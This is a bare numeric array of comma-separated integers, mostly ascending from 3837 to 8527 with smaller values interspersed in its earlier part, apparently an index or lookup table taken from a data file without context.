3837,3838,3839,3840,3841,3842,3843,3844,1349,3845,3846,3847,3848,3849,3850,3851,
3852,3853,3854,3855,3856,3857,3858,1594,3859,3860,3861,3862,3863,3864,3865,3866,
3867,3868,3869,1595,3870,3871,3872,3873,1596,3874,3875,3876,3877,3878,3879,3880,
3881,3882,3883,3884,3885,3886,1597,3887,3888,3889,3890,3891,3892,3893,3894,3895,
1598,3896,3897,3898,1599,1600,3899,1350,3900,1351,3901,3902,1352,3903,3904,3905,
3906,3907,3908,3909,3910,3911,3912,3913,3914,3915,3916,3917,3918,3919,3920,3921,
3922,3923,3924,1258,3925,3926,3927,3928,3929,3930,3931,1193,3932,1601,3933,3934,
3935,3936,3937,3938,3939,3940,3941,3942,3943,1602,3944,3945,3946,3947,3948,1603,
3949,3950,3951,3952,3953,3954,3955,3956,3957,3958,3959,3960,3961,3962,3963,3964,
3965,1604,3966,3967,3968,3969,3970,3971,3972,3973,3974,3975,3976,3977,1353,3978,
3979,3980,3981,3982,3983,3984,3985,3986,3987,3988,3989,3990,3991,1354,3992,3993,
3994,3995,3996,3997,3998,3999,4000,4001,4002,4003,4004,4005,4006,4007,4008,4009,
4010,4011,4012,4013,4014,4015,4016,4017,4018,4019,4020,4021,4022,4023,1355,4024,
4025,4026,4027,4028,4029,4030,4031,4032,4033,4034,4035,4036,4037,4038,4039,4040,
1605,4041,4042,4043,4044,4045,4046,4047,4048,4049,4050,4051,4052,4053,4054,4055,
4056,4057,4058,4059,4060,1606,4061,4062,4063,4064,1607,4065,4066,4067,4068,4069,
4070,4071,4072,4073,4074,4075,4076,1194,4077,4078,1608,4079,4080,4081,4082,4083,
4084,4085,4086,4087,1609,4088,4089,4090,4091,4092,4093,4094,4095,4096,4097,4098,
4099,4100,4101,4102,4103,4104,4105,4106,4107,4108,1259,4109,4110,4111,4112,4113,
4114,4115,4116,4117,4118,4119,4120,4121,4122,4123,4124,1195,4125,4126,4127,1610,
4128,4129,4130,4131,4132,4133,4134,4135,4136,4137,1356,4138,4139,4140,4141,4142,
4143,4144,1611,4145,4146,4147,4148,4149,4150,4151,4152,4153,4154,4155,4156,4157,
4158,4159,4160,4161,4162,4163,4164,4165,4166,4167,4168,4169,4170,4171,4172,4173,
4174,4175,4176,4177,4178,4179,4180,4181,4182,4183,4184,4185,4186,4187,4188,4189,
4190,4191,4192,4193,4194,4195,4196,4197,4198,4199,4200,4201,4202,4203,4204,4205,
4206,4207,4208,4209,4210,4211,4212,4213,4214,4215,4216,4217,4218,4219,1612,4220,
4221,4222,4223,4224,4225,4226,4227,1357,4228,1613,4229,4230,4231,4232,4233,4234,
4235,4236,4237,4238,4239,4240,4241,4242,4243,1614,4244,4245,4246,4247,4248,4249,
4250,4251,4252,4253,4254,4255,4256,4257,4258,4259,4260,4261,4262,4263,4264,4265,
4266,4267,4268,4269,4270,1196,1358,4271,4272,4273,4274,4275,4276,4277,4278,4279,
4280,4281,4282,4283,4284,4285,4286,4287,1615,4288,4289,4290,4291,4292,4293,4294,
4295,4296,4297,4298,4299,4300,4301,4302,4303,4304,4305,4306,4307,4308,4309,4310,
4311,4312,4313,4314,4315,4316,4317,4318,4319,4320,4321,4322,4323,4324,4325,4326,
4327,4328,4329,4330,4331,4332,4333,4334,1616,4335,4336,4337,4338,4339,4340,4341,
4342,4343,4344,4345,4346,4347,4348,4349,4350,4351,4352,4353,4354,4355,4356,4357,
4358,4359,4360,1617,4361,4362,4363,4364,4365,1618,4366,4367,4368,4369,4370,4371,
4372,4373,4374,4375,4376,4377,4378,4379,4380,4381,4382,4383,4384,4385,4386,4387,
4388,4389,4390,4391,4392,4393,4394,4395,4396,4397,4398,4399,4400,4401,4402,4403,
4404,4405,4406,4407,4408,4409,4410,4411,4412,4413,4414,4415,4416,1619,4417,4418,
4419,4420,4421,4422,4423,4424,4425,1112,4426,4427,4428,4429,4430,1620,4431,4432,
4433,4434,4435,4436,4437,4438,4439,4440,4441,4442,1260,1261,4443,4444,4445,4446,
4447,4448,4449,4450,4451,4452,4453,4454,4455,1359,4456,4457,4458,4459,4460,4461,
4462,4463,4464,4465,1621,4466,4467,4468,4469,4470,4471,4472,4473,4474,4475,4476,
4477,4478,4479,4480,4481,4482,4483,4484,4485,4486,4487,4488,4489,1055,4490,4491,
4492,4493,4494,4495,4496,4497,4498,4499,4500,4501,4502,4503,4504,4505,4506,4507,
4508,4509,4510,4511,4512,4513,4514,4515,4516,4517,4518,1622,4519,4520,4521,1623,
4522,4523,4524,4525,4526,4527,4528,4529,4530,4531,4532,4533,4534,4535,1360,4536,
4537,4538,4539,4540,4541,4542,4543, 975,4544,4545,4546,4547,4548,4549,4550,4551,
4552,4553,4554,4555,4556,4557,4558,4559,4560,4561,4562,4563,4564,4565,4566,4567,
4568,4569,4570,4571,1624,4572,4573,4574,4575,4576,1625,4577,4578,4579,4580,4581,
4582,4583,4584,1626,4585,4586,4587,4588,4589,4590,4591,4592,4593,4594,4595,1627,
4596,4597,4598,4599,4600,4601,4602,4603,4604,4605,4606,4607,4608,4609,4610,4611,
4612,4613,4614,4615,1628,4616,4617,4618,4619,4620,4621,4622,4623,4624,4625,4626,
4627,4628,4629,4630,4631,4632,4633,4634,4635,4636,4637,4638,4639,4640,4641,4642,
4643,4644,4645,4646,4647,4648,4649,1361,4650,4651,4652,4653,4654,4655,4656,4657,
4658,4659,4660,4661,1362,4662,4663,4664,4665,4666,4667,4668,4669,4670,4671,4672,
4673,4674,4675,4676,4677,4678,4679,4680,4681,4682,1629,4683,4684,4685,4686,4687,
1630,4688,4689,4690,4691,1153,4692,4693,4694,1113,4695,4696,4697,4698,4699,4700,
4701,4702,4703,4704,4705,4706,4707,4708,4709,4710,4711,1197,4712,4713,4714,4715,
4716,4717,4718,4719,4720,4721,4722,4723,4724,4725,4726,4727,4728,4729,4730,4731,
4732,4733,4734,4735,1631,4736,1632,4737,4738,4739,4740,4741,4742,4743,4744,1633,
4745,4746,4747,4748,4749,1262,4750,4751,4752,4753,4754,1363,4755,4756,4757,4758,
4759,4760,4761,4762,4763,4764,4765,4766,4767,4768,1634,4769,4770,4771,4772,4773,
4774,4775,4776,4777,4778,1635,4779,4780,4781,4782,4783,4784,4785,4786,4787,4788,
4789,1636,4790,4791,4792,4793,4794,4795,4796,4797,4798,4799,4800,4801,4802,4803,
4804,4805,4806,1637,4807,4808,4809,1638,4810,4811,4812,4813,4814,4815,4816,4817,
4818,1639,4819,4820,4821,4822,4823,4824,4825,4826,4827,4828,4829,4830,4831,4832,
4833,1077,4834,4835,4836,4837,4838,4839,4840,4841,4842,4843,4844,4845,4846,4847,
4848,4849,4850,4851,4852,4853,4854,4855,4856,4857,4858,4859,4860,4861,4862,4863,
4864,4865,4866,4867,4868,4869,4870,4871,4872,4873,4874,4875,4876,4877,4878,4879,
4880,4881,4882,4883,1640,4884,4885,1641,4886,4887,4888,4889,4890,4891,4892,4893,
4894,4895,4896,4897,4898,4899,4900,4901,4902,4903,4904,4905,4906,4907,4908,4909,
4910,4911,1642,4912,4913,4914,1364,4915,4916,4917,4918,4919,4920,4921,4922,4923,
4924,4925,4926,4927,4928,4929,4930,4931,1643,4932,4933,4934,4935,4936,4937,4938,
4939,4940,4941,4942,4943,4944,4945,4946,4947,4948,4949,4950,4951,4952,4953,4954,
4955,4956,4957,4958,4959,4960,4961,4962,4963,4964,4965,4966,4967,4968,4969,4970,
4971,4972,4973,4974,4975,4976,4977,4978,4979,4980,1644,4981,4982,4983,4984,1645,
4985,4986,1646,4987,4988,4989,4990,4991,4992,4993,4994,4995,4996,4997,4998,4999,
5000,5001,5002,5003,5004,5005,1647,5006,1648,5007,5008,5009,5010,5011,5012,1078,
5013,5014,5015,5016,5017,5018,5019,5020,5021,5022,5023,5024,5025,5026,5027,5028,
1365,5029,5030,5031,5032,5033,5034,5035,5036,5037,5038,5039,1649,5040,5041,5042,
5043,5044,5045,1366,5046,5047,5048,5049,5050,5051,5052,5053,5054,5055,1650,5056,
5057,5058,5059,5060,5061,5062,5063,5064,5065,5066,5067,5068,5069,5070,5071,5072,
5073,5074,5075,5076,5077,1651,5078,5079,5080,5081,5082,5083,5084,5085,5086,5087,
5088,5089,5090,5091,5092,5093,5094,5095,5096,5097,5098,5099,5100,5101,5102,5103,
5104,5105,5106,5107,5108,5109,5110,1652,5111,5112,5113,5114,5115,5116,5117,5118,
1367,5119,5120,5121,5122,5123,5124,5125,5126,5127,5128,5129,1653,5130,5131,5132,
5133,5134,5135,5136,5137,5138,5139,5140,5141,5142,5143,5144,5145,5146,5147,5148,
5149,1368,5150,1654,5151,1369,5152,5153,5154,5155,5156,5157,5158,5159,5160,5161,
5162,5163,5164,5165,5166,5167,5168,5169,5170,5171,5172,5173,5174,5175,5176,5177,
5178,1370,5179,5180,5181,5182,5183,5184,5185,5186,5187,5188,5189,5190,5191,5192,
5193,5194,5195,5196,5197,5198,1655,5199,5200,5201,5202,1656,5203,5204,5205,5206,
1371,5207,1372,5208,5209,5210,5211,1373,5212,5213,1374,5214,5215,5216,5217,5218,
5219,5220,5221,5222,5223,5224,5225,5226,5227,5228,5229,5230,5231,5232,5233,5234,
5235,5236,5237,5238,5239,5240,5241,5242,5243,5244,5245,5246,5247,1657,5248,5249,
5250,5251,1658,1263,5252,5253,5254,5255,5256,1375,5257,5258,5259,5260,5261,5262,
5263,5264,5265,5266,5267,5268,5269,5270,5271,5272,5273,5274,5275,5276,5277,5278,
5279,5280,5281,5282,5283,1659,5284,5285,5286,5287,5288,5289,5290,5291,5292,5293,
5294,5295,5296,5297,5298,5299,5300,1660,5301,5302,5303,5304,5305,5306,5307,5308,
5309,5310,5311,5312,5313,5314,5315,5316,5317,5318,5319,5320,5321,1376,5322,5323,
5324,5325,5326,5327,5328,5329,5330,5331,5332,5333,1198,5334,5335,5336,5337,5338,
5339,5340,5341,5342,5343,1661,5344,5345,5346,5347,5348,5349,5350,5351,5352,5353,
5354,5355,5356,5357,5358,5359,5360,5361,5362,5363,5364,5365,5366,5367,5368,5369,
5370,5371,5372,5373,5374,5375,5376,5377,5378,5379,5380,5381,5382,5383,5384,5385,
5386,5387,5388,5389,5390,5391,5392,5393,5394,5395,5396,5397,5398,1264,5399,5400,
5401,5402,5403,5404,5405,5406,5407,5408,5409,5410,5411,5412,1662,5413,5414,5415,
5416,1663,5417,5418,5419,5420,5421,5422,5423,5424,5425,5426,5427,5428,5429,5430,
5431,5432,5433,5434,5435,5436,5437,5438,1664,5439,5440,5441,5442,5443,5444,5445,
5446,5447,5448,5449,5450,5451,5452,5453,5454,5455,5456,5457,5458,5459,5460,5461,
5462,5463,5464,5465,5466,5467,5468,5469,5470,5471,5472,5473,5474,5475,5476,5477,
5478,1154,5479,5480,5481,5482,5483,5484,5485,1665,5486,5487,5488,5489,5490,5491,
5492,5493,5494,5495,5496,5497,5498,5499,5500,5501,5502,5503,5504,5505,5506,5507,
5508,5509,5510,5511,5512,5513,5514,5515,5516,5517,5518,5519,5520,5521,5522,5523,
5524,5525,5526,5527,5528,5529,5530,5531,5532,5533,5534,5535,5536,5537,5538,5539,
5540,5541,5542,5543,5544,5545,5546,5547,5548,1377,5549,5550,5551,5552,5553,5554,
5555,5556,5557,5558,5559,5560,5561,5562,5563,5564,5565,5566,5567,5568,5569,5570,
1114,5571,5572,5573,5574,5575,5576,5577,5578,5579,5580,5581,5582,5583,5584,5585,
5586,5587,5588,5589,5590,5591,5592,1378,5593,5594,5595,5596,5597,5598,5599,5600,
5601,5602,5603,5604,5605,5606,5607,5608,5609,5610,5611,5612,5613,5614,1379,5615,
5616,5617,5618,5619,5620,5621,5622,5623,5624,5625,5626,5627,5628,5629,5630,5631,
5632,5633,5634,1380,5635,5636,5637,5638,5639,5640,5641,5642,5643,5644,5645,5646,
5647,5648,5649,1381,1056,5650,5651,5652,5653,5654,5655,5656,5657,5658,5659,5660,
1666,5661,5662,5663,5664,5665,5666,5667,5668,1667,5669,1668,5670,5671,5672,5673,
5674,5675,5676,5677,5678,1155,5679,5680,5681,5682,5683,5684,5685,5686,5687,5688,
5689,5690,5691,5692,5693,5694,5695,5696,5697,5698,1669,5699,5700,5701,5702,5703,
5704,5705,1670,5706,5707,5708,5709,5710,1671,5711,5712,5713,5714,1382,5715,5716,
5717,5718,5719,5720,5721,5722,5723,5724,5725,1672,5726,5727,1673,1674,5728,5729,
5730,5731,5732,5733,5734,5735,5736,1675,5737,5738,5739,5740,5741,5742,5743,5744,
1676,5745,5746,5747,5748,5749,5750,5751,1383,5752,5753,5754,5755,5756,5757,5758,
5759,5760,5761,5762,5763,5764,5765,5766,5767,5768,1677,5769,5770,5771,5772,5773,
1678,5774,5775,5776, 998,5777,5778,5779,5780,5781,5782,5783,5784,5785,1384,5786,
5787,5788,5789,5790,5791,5792,5793,5794,5795,5796,5797,5798,5799,5800,1679,5801,
5802,5803,1115,1116,5804,5805,5806,5807,5808,5809,5810,5811,5812,5813,5814,5815,
5816,5817,5818,5819,5820,5821,5822,5823,5824,5825,5826,5827,5828,5829,5830,5831,
5832,5833,5834,5835,5836,5837,5838,5839,5840,5841,5842,5843,5844,5845,5846,5847,
5848,5849,5850,5851,5852,5853,5854,5855,1680,5856,5857,5858,5859,5860,5861,5862,
5863,5864,1681,5865,5866,5867,1682,5868,5869,5870,5871,5872,5873,5874,5875,5876,
5877,5878,5879,1683,5880,1684,5881,5882,5883,5884,1685,5885,5886,5887,5888,5889,
5890,5891,5892,5893,5894,5895,5896,5897,5898,5899,5900,5901,5902,5903,5904,5905,
5906,5907,1686,5908,5909,5910,5911,5912,5913,5914,5915,5916,5917,5918,5919,5920,
5921,5922,5923,5924,5925,5926,5927,5928,5929,5930,5931,5932,5933,5934,5935,1687,
5936,5937,5938,5939,5940,5941,5942,5943,5944,5945,5946,5947,5948,5949,5950,5951,
5952,1688,1689,5953,1199,5954,5955,5956,5957,5958,5959,5960,5961,1690,5962,5963,
5964,5965,5966,5967,5968,5969,5970,5971,5972,5973,5974,5975,5976,5977,5978,5979,
5980,5981,1385,5982,1386,5983,5984,5985,5986,5987,5988,5989,5990,5991,5992,5993,
5994,5995,5996,5997,5998,5999,6000,6001,6002,6003,6004,6005,6006,6007,6008,6009,
6010,6011,6012,6013,6014,6015,6016,6017,6018,6019,6020,6021,6022,6023,6024,6025,
6026,6027,1265,6028,6029,1691,6030,6031,6032,6033,6034,6035,6036,6037,6038,6039,
6040,6041,6042,6043,6044,6045,6046,6047,6048,6049,6050,6051,6052,6053,6054,6055,
6056,6057,6058,6059,6060,6061,6062,6063,6064,6065,6066,6067,6068,6069,6070,6071,
6072,6073,6074,6075,6076,6077,6078,6079,6080,6081,6082,6083,6084,1692,6085,6086,
6087,6088,6089,6090,6091,6092,6093,6094,6095,6096,6097,6098,6099,6100,6101,6102,
6103,6104,6105,6106,6107,6108,6109,6110,6111,6112,6113,6114,6115,6116,6117,6118,
6119,6120,6121,6122,6123,6124,6125,6126,6127,6128,6129,6130,6131,1693,6132,6133,
6134,6135,6136,1694,6137,6138,6139,6140,6141,1695,6142,6143,6144,6145,6146,6147,
6148,6149,6150,6151,6152,6153,6154,6155,6156,6157,6158,6159,6160,6161,6162,6163,
6164,6165,6166,6167,6168,6169,6170,6171,6172,6173,6174,6175,6176,6177,6178,6179,
6180,6181,6182,6183,6184,6185,1696,6186,6187,6188,6189,6190,6191,6192,6193,6194,
6195,6196,6197,6198,6199,6200,6201,6202,6203,6204,6205,6206,6207,6208,6209,6210,
6211,6212,6213,6214,6215,6216,6217,6218,6219,1697,6220,6221,6222,6223,6224,6225,
6226,6227,6228,6229,6230,6231,6232,6233,6234,6235,6236,6237,6238,6239,6240,6241,
6242,6243,6244,6245,6246,6247,6248,6249,6250,6251,6252,6253,1698,6254,6255,6256,
6257,6258,6259,6260,6261,6262,6263,1200,6264,6265,6266,6267,6268,6269,6270,6271,
6272,6273,6274,6275,6276,6277,6278,6279,6280,6281,6282,6283,6284,6285,6286,6287,
6288,6289,6290,6291,6292,6293,6294,6295,6296,6297,6298,6299,6300,6301,6302,1699,
6303,6304,1700,6305,6306,6307,6308,6309,6310,6311,6312,6313,6314,6315,6316,6317,
6318,6319,6320,6321,6322,6323,6324,6325,6326,6327,6328,6329,6330,6331,6332,6333,
6334,6335,6336,6337,6338,6339,1701,6340,6341,6342,6343,6344,1387,6345,6346,6347,
6348,6349,6350,6351,6352,6353,6354,6355,6356,6357,6358,6359,6360,6361,6362,6363,
6364,6365,6366,6367,6368,6369,6370,6371,6372,6373,6374,6375,6376,6377,6378,6379,
6380,6381,6382,6383,6384,6385,6386,6387,6388,6389,6390,6391,6392,6393,6394,6395,
6396,6397,6398,6399,6400,6401,6402,6403,6404,6405,6406,6407,6408,6409,6410,6411,
6412,6413,1702,6414,6415,6416,6417,6418,6419,6420,6421,6422,1703,6423,6424,6425,
6426,6427,6428,6429,6430,6431,6432,6433,6434,6435,6436,6437,6438,1704,6439,6440,
6441,6442,6443,6444,6445,6446,6447,6448,6449,6450,6451,6452,6453,6454,6455,6456,
6457,6458,6459,6460,6461,6462,6463,6464,6465,6466,6467,6468,6469,6470,6471,6472,
6473,6474,6475,6476,6477,6478,6479,6480,6481,6482,6483,6484,6485,6486,6487,6488,
6489,6490,6491,6492,6493,6494,6495,6496,6497,6498,6499,6500,6501,6502,6503,1266,
6504,6505,6506,6507,6508,6509,6510,6511,6512,6513,6514,6515,6516,6517,6518,6519,
6520,6521,6522,6523,6524,6525,6526,6527,6528,6529,6530,6531,6532,6533,6534,6535,
6536,6537,6538,6539,6540,6541,6542,6543,6544,6545,6546,6547,6548,6549,6550,6551,
1705,1706,6552,6553,6554,6555,6556,6557,6558,6559,6560,6561,6562,6563,6564,6565,
6566,6567,6568,6569,6570,6571,6572,6573,6574,6575,6576,6577,6578,6579,6580,6581,
6582,6583,6584,6585,6586,6587,6588,6589,6590,6591,6592,6593,6594,6595,6596,6597,
6598,6599,6600,6601,6602,6603,6604,6605,6606,6607,6608,6609,6610,6611,6612,6613,
6614,6615,6616,6617,6618,6619,6620,6621,6622,6623,6624,6625,6626,6627,6628,6629,
6630,6631,6632,6633,6634,6635,6636,6637,1388,6638,6639,6640,6641,6642,6643,6644,
1707,6645,6646,6647,6648,6649,6650,6651,6652,6653,6654,6655,6656,6657,6658,6659,
6660,6661,6662,6663,1708,6664,6665,6666,6667,6668,6669,6670,6671,6672,6673,6674,
1201,6675,6676,6677,6678,6679,6680,6681,6682,6683,6684,6685,6686,6687,6688,6689,
6690,6691,6692,6693,6694,6695,6696,6697,6698,6699,6700,6701,6702,6703,6704,6705,
6706,6707,6708,6709,6710,6711,6712,6713,6714,6715,6716,6717,6718,6719,6720,6721,
6722,6723,6724,6725,1389,6726,6727,6728,6729,6730,6731,6732,6733,6734,6735,6736,
1390,1709,6737,6738,6739,6740,6741,6742,1710,6743,6744,6745,6746,1391,6747,6748,
6749,6750,6751,6752,6753,6754,6755,6756,6757,1392,6758,6759,6760,6761,6762,6763,
6764,6765,6766,6767,6768,6769,6770,6771,6772,6773,6774,6775,6776,6777,6778,6779,
6780,1202,6781,6782,6783,6784,6785,6786,6787,6788,6789,6790,6791,6792,6793,6794,
6795,6796,6797,6798,6799,6800,6801,6802,6803,6804,6805,6806,6807,6808,6809,1711,
6810,6811,6812,6813,6814,6815,6816,6817,6818,6819,6820,6821,6822,6823,6824,6825,
6826,6827,6828,6829,6830,6831,6832,6833,6834,6835,6836,1393,6837,6838,6839,6840,
6841,6842,6843,6844,6845,6846,6847,6848,6849,6850,6851,6852,6853,6854,6855,6856,
6857,6858,6859,6860,6861,6862,6863,6864,6865,6866,6867,6868,6869,6870,6871,6872,
6873,6874,6875,6876,6877,6878,6879,6880,6881,6882,6883,6884,6885,6886,6887,6888,
6889,6890,6891,6892,6893,6894,6895,6896,6897,6898,6899,6900,6901,6902,1712,6903,
6904,6905,6906,6907,6908,6909,6910,1713,6911,6912,6913,6914,6915,6916,6917,6918,
6919,6920,6921,6922,6923,6924,6925,6926,6927,6928,6929,6930,6931,6932,6933,6934,
6935,6936,6937,6938,6939,6940,6941,6942,6943,6944,6945,6946,6947,6948,6949,6950,
6951,6952,6953,6954,6955,6956,6957,6958,6959,6960,6961,6962,6963,6964,6965,6966,
6967,6968,6969,6970,6971,6972,6973,6974,1714,6975,6976,6977,6978,6979,6980,6981,
6982,6983,6984,6985,6986,6987,6988,1394,6989,6990,6991,6992,6993,6994,6995,6996,
6997,6998,6999,7000,1715,7001,7002,7003,7004,7005,7006,7007,7008,7009,7010,7011,
7012,7013,7014,7015,7016,7017,7018,7019,7020,7021,7022,7023,7024,7025,7026,7027,
7028,1716,7029,7030,7031,7032,7033,7034,7035,7036,7037,7038,7039,7040,7041,7042,
7043,7044,7045,7046,7047,7048,7049,7050,7051,7052,7053,7054,7055,7056,7057,7058,
7059,7060,7061,7062,7063,7064,7065,7066,7067,7068,7069,7070,7071,7072,7073,7074,
7075,7076,7077,7078,7079,7080,7081,7082,7083,7084,7085,7086,7087,7088,7089,7090,
7091,7092,7093,7094,7095,7096,7097,7098,7099,7100,7101,7102,7103,7104,7105,7106,
7107,7108,7109,7110,7111,7112,7113,7114,7115,7116,7117,7118,7119,7120,7121,7122,
7123,7124,7125,7126,7127,7128,7129,7130,7131,7132,7133,7134,7135,7136,7137,7138,
7139,7140,7141,7142,7143,7144,7145,7146,7147,7148,7149,7150,7151,7152,7153,7154,
7155,7156,7157,7158,7159,7160,7161,7162,7163,7164,7165,7166,7167,7168,7169,7170,
7171,7172,7173,7174,7175,7176,7177,7178,7179,7180,7181,7182,7183,7184,7185,7186,
7187,7188,7189,7190,7191,7192,7193,7194,7195,7196,7197,7198,7199,7200,7201,7202,
7203,7204,7205,7206,7207,1395,7208,7209,7210,7211,7212,7213,1717,7214,7215,7216,
7217,7218,7219,7220,7221,7222,7223,7224,7225,7226,7227,7228,7229,7230,7231,7232,
7233,7234,7235,7236,7237,7238,7239,7240,7241,7242,7243,7244,7245,7246,7247,7248,
7249,7250,7251,7252,7253,7254,7255,7256,7257,7258,7259,7260,7261,7262,7263,7264,
7265,7266,7267,7268,7269,7270,7271,7272,7273,7274,7275,7276,7277,7278,7279,7280,
7281,7282,7283,7284,7285,7286,7287,7288,7289,7290,7291,7292,7293,7294,7295,7296,
7297,7298,7299,7300,7301,7302,7303,7304,7305,7306,7307,7308,7309,7310,7311,7312,
7313,1718,7314,7315,7316,7317,7318,7319,7320,7321,7322,7323,7324,7325,7326,7327,
7328,7329,7330,7331,7332,7333,7334,7335,7336,7337,7338,7339,7340,7341,7342,7343,
7344,7345,7346,7347,7348,7349,7350,7351,7352,7353,7354,7355,7356,7357,7358,7359,
7360,7361,7362,7363,7364,7365,7366,7367,7368,7369,7370,7371,7372,7373,7374,7375,
7376,7377,7378,7379,7380,7381,7382,7383,7384,7385,7386,7387,7388,7389,7390,7391,
7392,7393,7394,7395,7396,7397,7398,7399,7400,7401,7402,7403,7404,7405,7406,7407,
7408,7409,7410,7411,7412,7413,7414,7415,7416,7417,7418,7419,7420,7421,7422,7423,
7424,7425,7426,7427,7428,7429,7430,7431,7432,7433,7434,7435,7436,7437,7438,7439,
7440,7441,7442,7443,7444,7445,7446,7447,7448,7449,7450,7451,7452,7453,7454,7455,
7456,7457,7458,7459,7460,7461,7462,7463,7464,7465,7466,7467,7468,7469,7470,7471,
7472,7473,7474,7475,7476,7477,7478,7479,7480,7481,7482,7483,7484,7485,7486,7487,
7488,7489,7490,7491,7492,7493,7494,7495,7496,7497,7498,7499,7500,7501,7502,7503,
7504,7505,7506,7507,7508,7509,7510,7511,7512,7513,7514,7515,7516,7517,7518,7519,
7520,7521,7522,7523,7524,7525,7526,7527,7528,7529,7530,7531,7532,7533,7534,7535,
7536,7537,7538,7539,7540,7541,7542,7543,7544,7545,7546,7547,7548,7549,7550,7551,
7552,7553,7554,7555,7556,7557,7558,7559,7560,7561,7562,7563,7564,7565,7566,7567,
7568,7569,7570,7571,7572,7573,7574,7575,7576,7577,7578,7579,7580,7581,7582,7583,
7584,7585,7586,7587,7588,7589,7590,7591,7592,7593,7594,7595,7596,7597,7598,7599,
7600,7601,7602,7603,7604,7605,7606,7607,7608,7609,7610,7611,7612,7613,7614,7615,
7616,7617,7618,7619,7620,7621,7622,7623,7624,7625,7626,7627,7628,7629,7630,7631,
7632,7633,7634,7635,7636,7637,7638,7639,7640,7641,7642,7643,7644,7645,7646,7647,
7648,7649,7650,7651,7652,7653,7654,7655,7656,7657,7658,7659,7660,7661,7662,7663,
7664,7665,7666,7667,7668,7669,7670,7671,7672,7673,7674,7675,7676,7677,7678,7679,
7680,7681,7682,7683,7684,7685,7686,7687,7688,7689,7690,7691,7692,7693,7694,7695,
7696,7697,7698,7699,7700,7701,7702,7703,7704,7705,7706,7707,7708,7709,7710,7711,
7712,7713,7714,7715,7716,7717,7718,7719,7720,7721,7722,7723,7724,7725,7726,7727,
7728,7729,7730,7731,7732,7733,7734,7735,7736,7737,7738,7739,7740,7741,7742,7743,
7744,7745,7746,7747,7748,7749,7750,7751,7752,7753,7754,7755,7756,7757,7758,7759,
7760,7761,7762,7763,7764,7765,7766,7767,7768,7769,7770,7771,7772,7773,7774,7775,
7776,7777,7778,7779,7780,7781,7782,7783,7784,7785,7786,7787,7788,7789,7790,7791,
7792,7793,7794,7795,7796,7797,7798,7799,7800,7801,7802,7803,7804,7805,7806,7807,
7808,7809,7810,7811,7812,7813,7814,7815,7816,7817,7818,7819,7820,7821,7822,7823,
7824,7825,7826,7827,7828,7829,7830,7831,7832,7833,7834,7835,7836,7837,7838,7839,
7840,7841,7842,7843,7844,7845,7846,7847,7848,7849,7850,7851,7852,7853,7854,7855,
7856,7857,7858,7859,7860,7861,7862,7863,7864,7865,7866,7867,7868,7869,7870,7871,
7872,7873,7874,7875,7876,7877,7878,7879,7880,7881,7882,7883,7884,7885,7886,7887,
7888,7889,7890,7891,7892,7893,7894,7895,7896,7897,7898,7899,7900,7901,7902,7903,
7904,7905,7906,7907,7908,7909,7910,7911,7912,7913,7914,7915,7916,7917,7918,7919,
7920,7921,7922,7923,7924,7925,7926,7927,7928,7929,7930,7931,7932,7933,7934,7935,
7936,7937,7938,7939,7940,7941,7942,7943,7944,7945,7946,7947,7948,7949,7950,7951,
7952,7953,7954,7955,7956,7957,7958,7959,7960,7961,7962,7963,7964,7965,7966,7967,
7968,7969,7970,7971,7972,7973,7974,7975,7976,7977,7978,7979,7980,7981,7982,7983,
7984,7985,7986,7987,7988,7989,7990,7991,7992,7993,7994,7995,7996,7997,7998,7999,
8000,8001,8002,8003,8004,8005,8006,8007,8008,8009,8010,8011,8012,8013,8014,8015,
8016,8017,8018,8019,8020,8021,8022,8023,8024,8025,8026,8027,8028,8029,8030,8031,
8032,8033,8034,8035,8036,8037,8038,8039,8040,8041,8042,8043,8044,8045,8046,8047,
8048,8049,8050,8051,8052,8053,8054,8055,8056,8057,8058,8059,8060,8061,8062,8063,
8064,8065,8066,8067,8068,8069,8070,8071,8072,8073,8074,8075,8076,8077,8078,8079,
8080,8081,8082,8083,8084,8085,8086,8087,8088,8089,8090,8091,8092,8093,8094,8095,
8096,8097,8098,8099,8100,8101,8102,8103,8104,8105,8106,8107,8108,8109,8110,8111,
8112,8113,8114,8115,8116,8117,8118,8119,8120,8121,8122,8123,8124,8125,8126,8127,
8128,8129,8130,8131,8132,8133,8134,8135,8136,8137,8138,8139,8140,8141,8142,8143,
8144,8145,8146,8147,8148,8149,8150,8151,8152,8153,8154,8155,8156,8157,8158,8159,
8160,8161,8162,8163,8164,8165,8166,8167,8168,8169,8170,8171,8172,8173,8174,8175,
8176,8177,8178,8179,8180,8181,8182,8183,8184,8185,8186,8187,8188,8189,8190,8191,
8192,8193,8194,8195,8196,8197,8198,8199,8200,8201,8202,8203,8204,8205,8206,8207,
8208,8209,8210,8211,8212,8213,8214,8215,8216,8217,8218,8219,8220,8221,8222,8223,
8224,8225,8226,8227,8228,8229,8230,8231,8232,8233,8234,8235,8236,8237,8238,8239,
8240,8241,8242,8243,8244,8245,8246,8247,8248,8249,8250,8251,8252,8253,8254,8255,
8256,8257,8258,8259,8260,8261,8262,8263,8264,8265,8266,8267,8268,8269,8270,8271,
8272,8273,8274,8275,8276,8277,8278,8279,8280,8281,8282,8283,8284,8285,8286,8287,
8288,8289,8290,8291,8292,8293,8294,8295,8296,8297,8298,8299,8300,8301,8302,8303,
8304,8305,8306,8307,8308,8309,8310,8311,8312,8313,8314,8315,8316,8317,8318,8319,
8320,8321,8322,8323,8324,8325,8326,8327,8328,8329,8330,8331,8332,8333,8334,8335,
8336,8337,8338,8339,8340,8341,8342,8343,8344,8345,8346,8347,8348,8349,8350,8351,
8352,8353,8354,8355,8356,8357,8358,8359,8360,8361,8362,8363,8364,8365,8366,8367,
8368,8369,8370,8371,8372,8373,8374,8375,8376,8377,8378,8379,8380,8381,8382,8383,
8384,8385,8386,8387,8388,8389,8390,8391,8392,8393,8394,8395,8396,8397,8398,8399,
8400,8401,8402,8403,8404,8405,8406,8407,8408,8409,8410,8411,8412,8413,8414,8415,
8416,8417,8418,8419,8420,8421,8422,8423,8424,8425,8426,8427,8428,8429,8430,8431,
8432,8433,8434,8435,8436,8437,8438,8439,8440,8441,8442,8443,8444,8445,8446,8447,
8448,8449,8450,8451,8452,8453,8454,8455,8456,8457,8458,8459,8460,8461,8462,8463,
8464,8465,8466,8467,8468,8469,8470,8471,8472,8473,8474,8475,8476,8477,8478,8479,
8480,8481,8482,8483,8484,8485,8486,8487,8488,8489,8490,8491,8492,8493,8494,8495,
8496,8497,8498,8499,8500,8501,8502,8503,8504,8505,8506,8507,8508,8509,8510,8511,
8512,8513,8514,8515,8516,8517,8518,8519,8520,8521,8522,8523,8524,8525,8526,8527,
